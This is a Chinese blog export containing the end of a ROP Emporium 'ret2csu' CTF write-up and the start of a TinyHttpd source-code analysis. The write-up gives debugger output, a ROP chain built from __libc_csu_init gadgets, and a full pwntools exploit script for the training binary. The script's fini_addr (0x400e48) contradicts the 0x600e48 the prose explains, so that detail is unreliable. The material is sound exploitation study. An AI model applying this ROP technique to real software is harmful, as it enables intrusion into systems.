<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">rop --grep <span class="string">&#x27;rdx&#x27;</span></span></span><br><span class="line">0x00000000004004dd : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br></pre></td></tr></table></figure>

<p>这里也没有找到有用的gadget，当我们缺少传递参数的gadgets时，我们就要用到ret2csu方法，这个方法能够实现万能传参。</p>
<p>我们来具体查看下这段gadgets：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -dj .text ./ret2csu</span></span><br><span class="line">···</span><br><span class="line">0000000000400640 &lt;__libc_csu_init&gt;:</span><br><span class="line">···</span><br><span class="line">  400680:	4c 89 fa             	mov    rdx,r15</span><br><span class="line">  400683:	4c 89 f6             	mov    rsi,r14</span><br><span class="line">  400686:	44 89 ef             	mov    edi,r13d</span><br><span class="line">  400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</span><br><span class="line">  40068d:	48 83 c3 01          	add    rbx,0x1</span><br><span class="line">  400691:	48 39 dd             	cmp    rbp,rbx</span><br><span class="line">  400694:	75 ea                	jne    400680 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400696:	48 83 c4 08          	add    rsp,0x8</span><br><span class="line">  40069a:	5b                   	pop    rbx</span><br><span class="line">  40069b:	5d                   	pop    rbp</span><br><span class="line">  40069c:	41 5c                	pop    r12</span><br><span class="line">  40069e:	41 5d                	pop    r13</span><br><span class="line">  4006a0:	41 5e                	pop    r14</span><br><span class="line">  4006a2:	41 5f                	pop    r15</span><br><span class="line">  4006a4:	c3                   	ret </span><br></pre></td></tr></table></figure>

<p>我们主要用到的就是<code>__libc_csu_init</code>函数的这部分，这部分又常拆分为两部分用，<code>40069a</code>用来向寄存器传递值，<code>400680</code>用来向参数寄存器传递参数。</p>
<p>结合我们的思路，我们用ret2csu来构造的ROP如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x40069a	#pop rbx; rbp; r12; r13; r14; r15; ret</span><br><span class="line">0			#rbx</span><br><span class="line">1			#rbp</span><br><span class="line">r12			#call [r12]</span><br><span class="line">r13			#mov edi,r13d</span><br><span class="line">r14			#mov rsi,r14</span><br><span class="line">r15			#mov rdx,r15</span><br><span class="line">0x400680	#mov</span><br><span class="line">pop rdi</span><br><span class="line">argv_rdi</span><br><span class="line">ret2win@plt</span><br></pre></td></tr></table></figure>

<p>这里我们需要注意的有两点：</p>
<p>第一：这里操作的是edi，也就是只对rdi的低32位进行了赋值，而我们传递的参数高32位也是有值的，所以，我们还需要再通过一个对rdi操作的gadget来传递完整的参数。</p>
<p>我们从上边的gadgets可以找到：<code>0x00000000004006a3 : pop rdi ; ret</code></p>
<p>第二：由于我们这里不需要泄露libc的地址，并且<code>rbx=0</code>，所以这里的指令 <code>call [r12]</code>，需要一个能ret的函数，而且这个函数内部不能有影响堆栈平衡和寄存器值的指令。注意，填在<code>r12</code>处的地址需要解引用，类似got这样的跳转表，我们不能直接填入函数地址。</p>
<p>pwndbg工具提供了telescope命令，翻译为望远镜很形象：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">help</span> telescope</span></span><br><span class="line">Recursively dereferences pointers starting at the specified address</span><br></pre></td></tr></table></figure>

<p>除了got，dynamic，init_array，fini_array这几个section也可以试一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf -S ret2csu</span><br><span class="line">There are 29 section headers, starting at offset 0x1930:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  ...</span><br><span class="line">  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00</span><br><span class="line">       00000000000001f0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000028  0000000000000008  WA       0     0     8</span><br><span class="line">pwndbg&gt; telescope 0x0000000000600df0 2		# init_array + fini_array</span><br><span class="line">00:0000│  0x600df0 (__init_array_start) —▸ 0x400600 (frame_dummy) ◂— push   rbp</span><br><span class="line">01:0008│  0x600df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4005d0 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200a61], 0</span><br><span class="line">pwndbg&gt; telescope 0x0000000000600e00 62		# dynamic</span><br><span class="line">00:0000│  0x600e00 (_DYNAMIC) ◂— 0x1</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">...</span><br><span class="line">07:0038│  0x600e38 (_DYNAMIC+56) —▸ 0x4004d0 (_init) ◂— sub    rsp, 8		!!!!!!!!!!!!!</span><br><span class="line">08:0040│  0x600e40 (_DYNAMIC+64) ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">09:0048│  0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini) ◂— sub    rsp, 8		!!!!!!!!!!!!!</span><br><span class="line">0a:0050│  0x600e50 (_DYNAMIC+80) ◂— 0x19</span><br><span class="line">0b:0058│  0x600e58 (_DYNAMIC+88) —▸ 0x600df0 (__init_array_start) —▸ 0x400600 (frame_dummy) ◂— push   rbp	!!!!!!!!!!!!!!</span><br><span class="line">...</span><br><span class="line">0f:0078│  0x600e78 (_DYNAMIC+120) —▸ 0x600df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4005d0 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200a61], 0</span><br><span class="line">...</span><br><span class="line">13:0098│  0x600e98 (_DYNAMIC+152) —▸ 0x400298 ◂— add    eax, dword ptr [rax]</span><br><span class="line">14:00a0│  0x600ea0 (_DYNAMIC+160) ◂— 0x5</span><br><span class="line">15:00a8│  0x600ea8 (_DYNAMIC+168) —▸ 0x4003c0 ◂— add    byte ptr [rcx + rbp*2 + 0x62], ch</span><br><span class="line">16:00b0│  0x600eb0 (_DYNAMIC+176) ◂— 0x6</span><br><span class="line">17:00b8│  0x600eb8 (_DYNAMIC+184) —▸ 0x4002d0 ◂— add    byte ptr [rax], al</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope 0x0000000000600ff0 7</span><br><span class="line">00:0000│  0x600ff0 —▸ 0x7ffff7800ba0 (__libc_start_main) ◂— push   r13</span><br><span class="line">01:0008│  0x600ff8 ◂— 0x0</span><br><span class="line">02:0010│  0x601000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x600e00 (_DYNAMIC) ◂— 0x1</span><br><span class="line">03:0018│  0x601008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7ffe170 ◂— 0x0</span><br><span class="line">04:0020│  0x601010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7dea820 (_dl_runtime_resolve_xsave) ◂— push   rbx</span><br><span class="line">05:0028│  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x400506 (pwnme@plt+6) ◂— push   0 /* &#x27;h&#x27; */</span><br><span class="line">06:0030│  0x601020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x400516 (ret2win@plt+6) ◂— push   1</span><br></pre></td></tr></table></figure>

<p>通过<code>telescope</code>命令，我们可以得到如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x600df0 (__init_array_start) —▸ 0x400600 (frame_dummy)</span><br><span class="line">0x600df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4005d0 (__do_global_dtors_aux)</span><br><span class="line">0x600e38 (_DYNAMIC+56) —▸ 0x4004d0 (_init)</span><br><span class="line">0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini)</span><br></pre></td></tr></table></figure>

<p><code>init_array_start</code>函数是ELF程序的一个初始化函数，运行它一般不会对栈造成影响，但这里却改变了rsi的值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">00000000000008a0 &lt;register_tm_clones&gt;:</span><br><span class="line"> 8a0:   48 8d 3d d1 17 20 00    lea    rdi,[rip+0x2017d1]        # 202078 &lt;_edata&gt;</span><br><span class="line"> 8a7:   48 8d 35 ca 17 20 00    lea    rsi,[rip+0x2017ca]        # 202078 &lt;_edata&gt;</span><br><span class="line"> 8ae:   55                      push   rbp</span><br><span class="line"> 8af:   48 29 fe                sub    rsi,rdi	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"> 8b2:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 8b5:   48 c1 fe 03             sar    rsi,0x3	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"> 8b9:   48 89 f0                mov    rax,rsi</span><br><span class="line"> 8bc:   48 c1 e8 3f             shr    rax,0x3f</span><br><span class="line"> 8c0:   48 01 c6                add    rsi,rax	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"> 8c3:   48 d1 fe                sar    rsi,1	!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line">0000000000000930 &lt;frame_dummy&gt;:</span><br><span class="line"> 930:   55                      push   rbp</span><br><span class="line"> 931:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 934:   5d                      pop    rbp</span><br><span class="line"> 935:   e9 66 ff ff ff          jmp    8a0 &lt;register_tm_clones&gt;</span><br></pre></td></tr></table></figure>

<p>我们再来看下<code>_init</code>和<code>_fini</code>，其实这两个也就是段<code>.init</code>和<code>.fini</code>里的函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">disass _fini</span></span><br><span class="line">Dump of assembler code for function _fini:</span><br><span class="line">   0x00000000004006b4 &lt;+0&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00000000004006b8 &lt;+4&gt;:	add    rsp,0x8</span><br><span class="line">   0x00000000004006bc &lt;+8&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>为了节省篇幅，这里就不看<code>_init</code>了，有兴趣可以自己反汇编看一下。</p>
<p>我们可以看到<code>_fini</code>函数满足我们的要求：不影响堆栈平衡和寄存器的值</p>
<p>所以，根据引用关系：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini)</span><br></pre></td></tr></table></figure>

<p><code>r12</code>寄存器处应该填<code>0x600e48</code>，而不是<code>0x4006b4</code>。</p>
<p>我们所需的所有东西都准备齐了，ROP chain对应的payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= p64(<span class="number">0x40069a</span>) <span class="comment">#pop rbx;rbp;r12;r13;r14;r15</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(fini_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0xcafebabecafebabe</span>)+p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload+= p64(<span class="number">0x400680</span>) <span class="comment">#mov </span></span><br><span class="line">payload+= p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+= p64(pop_rdi_addr)</span><br><span class="line">payload+= p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload+= p64(ret2win)</span><br></pre></td></tr></table></figure>

<p>对应的栈结构如图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321202753801.png" alt="image-20230321202753801"></p>
<p>这里需要注意的一点是，我们在看雪pwn入门中，第一个返回地址后跟了一个填充字节，其实与我们具体的gadget有关，这段gadgets不是固定的，所以我们要根据具体的gadgets来做相应的调整，但是总体思路不变。</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = e.plt[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">fini_addr = <span class="number">0x400e48</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets:</span></span><br><span class="line"><span class="comment"># 400680:	4c 89 fa             	mov    rdx,r15</span></span><br><span class="line"><span class="comment"># 400683:	4c 89 f6             	mov    rsi,r14</span></span><br><span class="line"><span class="comment"># 400686:	44 89 ef             	mov    edi,r13d</span></span><br><span class="line"><span class="comment"># 400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment"># 40068d:	48 83 c3 01          	add    rbx,0x1</span></span><br><span class="line"><span class="comment"># 400691:	48 39 dd             	cmp    rbp,rbx</span></span><br><span class="line"><span class="comment"># 400694:	75 ea                	jne    400680 &lt;__libc_csu_init+0x40&gt;</span></span><br><span class="line"><span class="comment"># 400696:	48 83 c4 08          	add    rsp,0x8</span></span><br><span class="line"><span class="comment"># 40069a:	5b                   	pop    rbx</span></span><br><span class="line"><span class="comment"># 40069b:	5d                   	pop    rbp</span></span><br><span class="line"><span class="comment"># 40069c:	41 5c                	pop    r12</span></span><br><span class="line"><span class="comment"># 40069e:	41 5d                	pop    r13</span></span><br><span class="line"><span class="comment"># 4006a0:	41 5e                	pop    r14</span></span><br><span class="line"><span class="comment"># 4006a2:	41 5f                	pop    r15</span></span><br><span class="line"><span class="comment"># 4006a4:	c3                   	ret </span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006a3</span></span><br><span class="line"><span class="comment"># 4006a3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#rbx=0</span></span><br><span class="line"><span class="comment">#rbp=1</span></span><br><span class="line"><span class="comment">#rdx=r15</span></span><br><span class="line"><span class="comment">#rsi=r14</span></span><br><span class="line"><span class="comment">#edi=r13d(第一个参数，缺少高32bit)</span></span><br><span class="line"><span class="comment">#r12 返回地址，call指令调用的函数引用</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= p64(<span class="number">0x40069a</span>) <span class="comment">#pop rbx;rbp;r12;r13;r14;r15</span></span><br><span class="line">payload+= p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(fini_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0xcafebabecafebabe</span>)+p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload+= p64(<span class="number">0x400680</span>) <span class="comment">#mov </span></span><br><span class="line">payload+= p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+= p64(pop_rdi_addr)</span><br><span class="line">payload+= p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload+= p64(ret2win)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终执行结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ret2csu by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Thank you!</span></span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Process &#x27;./ret2csu&#x27; stopped with exit code 0 (pid 23048)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>TinyHttpd源码分析</title>
    <url>/2023/05/05/Web/TinyHttpd%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="TinyHttpd源码分析"><a href="#TinyHttpd源码分析" class="headerlink" title="TinyHttpd源码分析"></a>TinyHttpd源码分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在分析固件，逆向完后反编译得到的伪代码看到不是特别懂，自我感觉是对web服务器端的Http请求处理流程比较模糊，正好之前学习《IoT安全入门》课程的时候提到过一个比较轻量的服务端程序Tinyhttpd，俗话说的好”麻雀虽小，五脏俱全”，之前听课的时候没有好好学，特此来补课留档。</p>
<h3 id="Tinyhttpd简介"><a href="#Tinyhttpd简介" class="headerlink" title="Tinyhttpd简介"></a>Tinyhttpd简介</h3><p>Tinyhttpd是J.David Blackstone在1999年写的一个不到500行的超轻量型Http服务端程序，通过阅读代码，可以帮助我们理解Web服务器程序的本质。</p>
<p>Tinyhttpd主页地址：<a href="https://tinyhttpd.sourceforge.net/">https://tinyhttpd.sourceforge.net/</a></p>
<p><strong>注：</strong>分析该源码需要了解Http报文的相关知识，这里就先不介绍了（以后有空的话可能补上），大家可以自行百度、Google或者ChatGPT学习。</p>
<span id="more"></span>

<h2 id="Tinyhttpd源码分析"><a href="#Tinyhttpd源码分析" class="headerlink" title="Tinyhttpd源码分析"></a>Tinyhttpd源码分析</h2><p>Tinyhttpd项目地址：<a href="https://sourceforge.net/projects/tinyhttpd/">https://sourceforge.net/projects/tinyhttpd/</a></p>
<p>注：该项目貌似不能直接在Ubunut等Linux发行版上运行，它本来是solaris上实现的，在socket和pthread的实现上和一般的Linux有些不同，需要修改一部分内容。Github上有大佬修改后的项目<a href="https://github.com/qiyeboy/SourceAnalysis">Tinyhttpd_for_linux</a>，直接make编译即可。</p>
<h3 id="1-整体流程图"><a href="#1-整体流程图" class="headerlink" title="1. 整体流程图"></a>1. 整体流程图</h3><p>先上两张网上找到的比较不错的Tinyhttpd的整体流程图，从整体上了解Tinyhttpd是如何运作的。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/tinyhttpd.png" alt="Tinyhttpd流程图"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/422590-20171110141226856-793077190.png" alt="img"></p>
<h3 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2. 源码分析"></a>2. 源码分析</h3><h4 id="2-1-函数构成"><a href="#2-1-函数构成" class="headerlink" title="2.1 函数构成"></a>2.1 函数构成</h4><p>Tinyhttpd主要包含以下几个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">accept_request</span><span class="params">(<span class="type">int</span>)</span>; <span class="comment">//处理从套接字上监听到的一个HTTP请求，在这里可以很大一部分地体现服务器处理请求的流程。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bad_request</span><span class="params">(<span class="type">int</span>)</span>; <span class="comment">//返回给客户端这是个错误请求，HTTP 状态码 400 BAD REQUEST</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat</span><span class="params">(<span class="type">int</span>, FILE *)</span>; <span class="comment">//读取服务器上的某个文件写到 socket 套接字。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cannot_execute</span><span class="params">(<span class="type">int</span>)</span>; <span class="comment">//主要处理发生在执行 cgi 程序时出现的错误。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *)</span>; <span class="comment">//把错误信息写到 perror 并退出。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_cgi</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *)</span>; <span class="comment">//运行 cgi 程序的处理。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_line</span><span class="params">(<span class="type">int</span>, <span class="type">char</span> *, <span class="type">int</span>)</span>; <span class="comment">//读取套接字的一行，把回车换行等情况都统一为换行符结束。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">headers</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *)</span>; <span class="comment">//把 HTTP 响应的头部写到套接字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">not_found</span><span class="params">(<span class="type">int</span>)</span>; <span class="comment">//主要处理找不到请求的文件时的情况。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">serve_file</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *)</span>; <span class="comment">//调用 cat 把服务器文件返回给浏览器。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">startup</span><span class="params">(u_short *)</span>; <span class="comment">//初始化 httpd 服务，包括建立套接字，绑定端口，进行监听等。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unimplemented</span><span class="params">(<span class="type">int</span>)</span>; <span class="comment">//返回给浏览器表明收到的 HTTP 请求所用的 method 不被支持。</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-头文件与宏定义"><a href="#2-2-头文件与宏定义" class="headerlink" title="2.2 头文件与宏定义"></a>2.2 头文件与宏定义</h4><p>首先看一下导入的头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>以及宏定义部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ISspace(x) isspace((int)(x))</span></span><br><span class="line"><span class="comment">// 定义 ISspace 的宏，它接受一个参数 x </span></span><br><span class="line"><span class="comment">// 该宏使用标准C库中的 isspace() 函数来确定输入的字符是否为空格字符</span></span><br><span class="line"><span class="comment">// 返回值：若参数 x 为空白字符，则返回非 0，否则返回 0.</span></span><br><span class="line"><span class="comment">// 空格字符包括空格（&#x27; &#x27;）、制表符（&#x27;t&#x27;）、换行符（&#x27;n&#x27;）、回车符（&#x27;r&#x27;）、换页符（&#x27;f&#x27;）和垂直制表符（&#x27;v&#x27;）等。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_STRING <span class="string">&quot;Server: jdbhttpd/0.1.0\r\n&quot;</span></span></span><br><span class="line"><span class="comment">// 定义 server 名称。</span></span><br></pre></td></tr></table></figure>

<h4 id="2-3-main主函数"><a href="#2-3-main主函数" class="headerlink" title="2.3 main主函数"></a>2.3 main主函数</h4><p>接下来，我们首先看 main 主函数，以此来查看程序的整体执行逻辑：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> server_sock = <span class="number">-1</span>; <span class="comment">//服务器 socket 文件描述符，初始化为-1</span></span><br><span class="line"> u_short port = <span class="number">0</span>; <span class="comment">//指定的服务器端口号，初始化为0</span></span><br><span class="line"> <span class="type">int</span> client_sock = <span class="number">-1</span>; <span class="comment">//客户端连接的socket文件描述符，初始化为-1</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_name</span>;</span> <span class="comment">//客户端地址结构体变量，在accept函数中用于存储客户端地址信息</span></span><br><span class="line"> <span class="type">socklen_t</span> client_name_len = <span class="keyword">sizeof</span>(client_name); <span class="comment">//获取客户端地址结构体的大小，并将其赋值给变量 client_name_len</span></span><br><span class="line"> <span class="comment">// 上边 client_name_len 源码为 int 类型，这里要转换为 socklen_t 类型，应该是之前提到的系统关于socket的实现问题。</span></span><br><span class="line"> <span class="type">pthread_t</span> newthread; <span class="comment">//定义线程变量</span></span><br><span class="line"></span><br><span class="line"> server_sock = startup(&amp;port); <span class="comment">// 调用startup函数，初始化httpd服务。</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;httpd running on port %d\n&quot;</span>, port);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> &#123;<span class="comment">//等待客户端请求连接，并返回已连接的客户端套接字描述符</span></span><br><span class="line">  <span class="comment">//函数原型：int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</span></span><br><span class="line">  client_sock = accept(server_sock, </span><br><span class="line">                       (<span class="keyword">struct</span> sockaddr *)&amp;client_name,</span><br><span class="line">                       &amp;client_name_len);</span><br><span class="line">  <span class="keyword">if</span> (client_sock == <span class="number">-1</span>) </span><br><span class="line">	  error_die(<span class="string">&quot;accept&quot;</span>); <span class="comment">//如果accept出错，则调用error_die函数处理错误并退出。</span></span><br><span class="line">  <span class="comment">/* accept_request(client_sock); */</span></span><br><span class="line">  <span class="comment">//上面一行代码被注释掉了，原本调用accept_request函数处理客户端请求，现在使用多线程技术进行并发处理</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//创建一个新的线程来处理当前已连接的客户端socket</span></span><br><span class="line">  <span class="comment">//将client_sock转换为intptr_t类型，再将其强制转换为void指针类型，作为第四个参数传递给accept_request函数</span></span><br><span class="line">  <span class="keyword">if</span> (pthread_create(&amp;newthread, <span class="literal">NULL</span>, (<span class="type">void</span> *)accept_request, (<span class="type">void</span> *)(<span class="type">intptr_t</span>)client_sock) != <span class="number">0</span>)</span><br><span class="line">	  perror(<span class="string">&quot;pthread_create&quot;</span>); <span class="comment">//如果创建线程失败，输出错误信息</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> close(server_sock); <span class="comment">//关闭服务端套接字</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下是对 <code>accept</code> 函数中各参数的详细解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client_sock = accept(server_sock, (struct sockaddr *)&amp;client_name, &amp;client_name_len);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>server_sock</code>：表示监听套接字文件描述符，该套接字已经调用了 <code>listen</code> 函数，并等待客户端连接请求。</li>
<li><code>(struct sockaddr *)&amp;client_name</code>：表示指向存放客户端地址信息的结构体变量的指针。<code>accept</code> 函数将客户端的 IP 地址和端口号存储在它所传入的这个地址结构体中。因为这个函数的第二个参数要求传入的是一个指向某种类型的指针，所以我们需要将 <code>client_name</code> 地址结构体变量强制转换成 <code>(struct sockaddr *)</code> 类型的指针。</li>
<li><code>&amp;client_name_len</code>：表示指向整数型变量的指针，用于存储客户端地址结构体的长度。在调用 <code>accept</code> 函数之前，我们需要先初始化 <code>client_name_len</code> 的值，通常是使用 <code>sizeof</code> 运算符来获取 <code>client_name</code> 结构体所占用的字节数。调用 <code>accept</code> 函数后，它将会返回客户端实际地址结构体的大小（单位是字节），并且更新 <code>client_name_len</code> 变量的值。</li>
<li><code>client_sock</code>：表示客户端套接字文件描述符，如果成功地建立了与客户端的连接，则该变量将保存与客户端通信的文件描述符。如果 <code>accept</code> 函数失败，则 <code>client_sock</code> 的值为 -1。</li>
</ul>
